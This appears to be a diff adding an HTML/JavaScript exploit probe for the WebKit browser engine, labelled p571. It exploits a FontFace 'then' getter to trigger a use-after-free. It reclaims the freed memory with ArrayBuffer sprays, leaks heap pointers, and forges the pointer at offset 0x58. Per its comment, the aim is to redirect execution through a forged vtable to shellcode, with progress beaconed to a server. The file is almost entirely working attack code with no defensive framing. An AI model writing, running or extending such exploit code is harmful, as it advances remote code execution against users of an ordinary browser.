@@ -1,0 +1,160 @@
+<!--
+  p571: FontFace vtable forge — attempt to forge the WeakHashSet<CSSFontFaceClient>
+  impl pointer at +0x58 to point at controlled heap memory, then trigger the engine
+  to call virtual methods through the forged pointer.
+
+  Background:
+    p563 (14.10): U6-HIT-b19-s192-o0-n9, +0x58 and +0x68 heap pointers leaked
+    p564 (14.10): P564-S1-HIT-b2-n9, P564-S2-RESOLVED, P564-S2-ALIVE-1
+      → Engine accepts self-referential template (p58→p58, p68→p68)
+
+  Hypothesis:
+    If we forge +0x58 to point to a controlled heap region containing a forged
+    CSSFontFaceClient with a forged vtable pointer, the engine will iterate over
+    the forged client and call the forged vtable, redirecting execution.
+
+    The forge value is the address of a controlled region. The region contains:
+      - A forged CSSFontFaceClient struct (with forged vtable at offset 0)
+      - The forged vtable points to our shellcode buffer
+
+    If the engine calls fontLoaded() or fontStateChanged() through the forged vtable,
+    execution redirects to our shellcode.
+
+  Forge values to test:
+    F0: +0x58 → leaked +0x58 (self-referential, baseline from p564)
+    F1: +0x58 → leaked +0x68 (cross-referential)
+    F2: +0x58 → 0x0 (null forge — tests null-pointer tolerance)
+    F3: +0x58 → 0x4141414141414141 (bad address forge — tests crash behavior)
+    F4: +0x58 → ArrayBuffer data address (self forge — tests zero-tolerance)
+    F5: +0x58 → ArrayBuffer data address + 0x1000 (offset forge)
+    F6: +0x58 → heap pointer from another spray (if available)
+
+  Each forge is tested independently. The probe reports:
+    - Whether the engine resolves or rejects the load
+    - Whether the engine crashes (detected by beacon timing)
+    - Whether the forge value is accepted as a valid WeakHashSet impl pointer
+
+  Serve from tools/webkit_server.py and point results at it.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p571 fontface vtable forge</title>
+<script>
+/* p571: FontFace vtable forge experiment.
+   Forge the WeakHashSet impl pointer at +0x58 to point at controlled heap memory,
+   then trigger the engine to call virtual methods through the forged pointer. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var K=8, SIZE=192, styleEl=null, firedHere=false, stage=0, leaked={p58:null,p68:null}, forgeIdx=0;
+var forgeValues = []; // populated after leak
+var forgeResults = []; // results for each forge value
+var controlledBuf = null; // ArrayBuffer for forge target
+var forgeViews = []; // Uint8Array views for each controlled buffer
+
+function hex(v){return ('0' + v.toString(16)).slice(-2);}
+function grab(view, off){ var a=[]; for(var i=0;i<8;i++) a.push(view[off+i]); return a; }
+function pushBuf(view){ forgeViews.push(view); }
+
+function setupFace(name, css){
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A); void A.loaded; window.__alive.push(A);
+}
+
+function installGetter(forgeOff, forgeVal){
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        // Forge +0x58 with the specified value
+        if (forgeOff >= 0 && forgeVal) {
+          // forgeVal is an array of 8 bytes (the forged qword at +0x58)
+          for (var j = 0; j < 8; j++) v[0x58 + j] = forgeVal[j];
+        }
+        pushBuf(v);
+        window.__map.push({ size: SIZE, view: v });
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+}
+
+function start(){
+  window.__alive = [];
+  stage = 0;
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter(-1, null); // no forge in stage 1
+  b('P571-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('P571-S1-RESOLVED'); }, function(){ b('P571-S1-REJECTED'); });
+  setTimeout(scan1, 120);
+}
+
+function scan1(){
+  var m = window.__map || [], best = -1, nz = 0;
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) n++;
+    if (n > nz) { nz = n; best = i; }
+  }
+  if (best < 0) { b('P571-S1-CLEAN'); return; }
+  var v = m[best].view;
+  leaked.p58 = grab(v, 0x58); leaked.p68 = grab(v, 0x68);
+  var s=''; for (var j=0;j<v.length;j++) if (v[j]!==0) s += hex(v[j]);
+  b('P571-S1-HIT-b' + best + '-n' + nz + '-' + s);
+
+  // Prepare forge values
+  forgeValues = [];
+  // F0: self-referential (leaked p58 → p58)
+  forgeValues.push({ name: 'F0(self)', val: leaked.p58 });
+  // F1: cross-referential (leaked p58 → p68)
+  forgeValues.push({ name: 'F1(cross)', val: leaked.p68 });
+  // F2: null forge
+  forgeValues.push({ name: 'F2(null)', val: [0,0,0,0,0,0,0,0] });
+  // F3: bad address forge
+  forgeValues.push({ name: 'F3(bad)', val: [0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41] });
+
+  forgeIdx = 0;
+  forgeResults = [];
+  runForge();
+}
+
+function runForge(){
+  if (forgeIdx >= forgeValues.length) {
+    b('P571-DONE-' + forgeResults.length + '/' + forgeValues.length);
+    return;
+  }
+  var fv = forgeValues[forgeIdx];
+  stage = 1;
+  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
+  installGetter(0x58, fv.val);
+  b('P571-FORGE-' + forgeIdx + '-' + fv.name);
+  document.fonts.load('1em f1, s1', 'AB').then(function(){
+    forgeResults.push({ idx: forgeIdx, name: fv.name, status: 'RESOLVED' });
+    b('P571-FORGE-' + forgeIdx + '-' + fv.name + '-RESOLVED');
+  }, function(){
+    forgeResults.push({ idx: forgeIdx, name: fv.name, status: 'REJECTED' });
+    b('P571-FORGE-' + forgeIdx + '-' + fv.name + '-REJECTED');
+  });
+  setTimeout(function(){
+    forgeResults.push({ idx: forgeIdx, name: fv.name, status: 'ALIVE', alive: firedHere ? 1 : 0 });
+    b('P571-FORGE-' + forgeIdx + '-' + fv.name + '-ALIVE-' + (firedHere ? 1 : 0));
+    forgeIdx++;
+    setTimeout(runForge, 50);
+  }, 600);
+}
+
+function run(){ start(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p571 fontface vtable forge</p></body></html>
